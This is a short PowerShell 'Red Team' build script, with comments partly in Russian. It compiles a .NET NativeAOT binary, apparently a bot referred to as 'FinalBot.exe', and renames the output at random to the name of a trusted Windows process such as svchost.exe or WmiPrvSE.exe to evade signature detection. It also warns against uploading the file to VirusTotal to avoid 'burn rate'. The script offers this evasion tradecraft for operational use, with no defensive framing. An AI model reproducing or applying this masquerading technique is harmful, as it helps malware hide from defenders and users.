#!/usr/bin/env pwsh
# publish.ps1 — Red Team build script
# Компилирует NativeAOT билд и автоматически меняет имя EXE для обхода сигнатур

$OutputDir = ".\bin\Release\net8.0-windows\win-x64\publish"

# Список системных имён, которые не вызывают подозрений
$SystemNames = @(
    "svchost.exe",
    "RuntimeBroker.exe",
    "backgroundTaskHost.exe",
    "MicrosoftEdgeUpdate.exe",
    "SearchFilterHost.exe",
    "WmiPrvSE.exe"
)

Write-Host "[*] Building NativeAOT release..." -ForegroundColor Cyan

dotnet publish -c Release -r win-x64 -p:PublishAot=true --nologo

if ($LASTEXITCODE -ne 0) {
    Write-Host "[!] Build FAILED" -ForegroundColor Red
    exit 1
}

$Source = Join-Path $OutputDir "svchost.exe"
if (!(Test-Path $Source)) {
    Write-Host "[!] FinalBot.exe not found in $OutputDir" -ForegroundColor Red
    exit 1
}

# Pick a random system name each build — no static signature
$ChosenName = $SystemNames[(Get-Random -Maximum $SystemNames.Length)]
$Dest = Join-Path $OutputDir $ChosenName

Copy-Item $Source $Dest -Force
Remove-Item $Source -Force

Write-Host ""
Write-Host "[+] Build SUCCESSFUL" -ForegroundColor Green
Write-Host "[+] Output : $Dest" -ForegroundColor Green
Write-Host "[+] Name   : $ChosenName" -ForegroundColor Yellow
Write-Host "[+] Size   : $([math]::Round((Get-Item $Dest).Length / 1MB, 1)) MB" -ForegroundColor White
Write-Host ""
Write-Host "[!] DO NOT upload to VirusTotal (burn rate)." -ForegroundColor DarkYellow
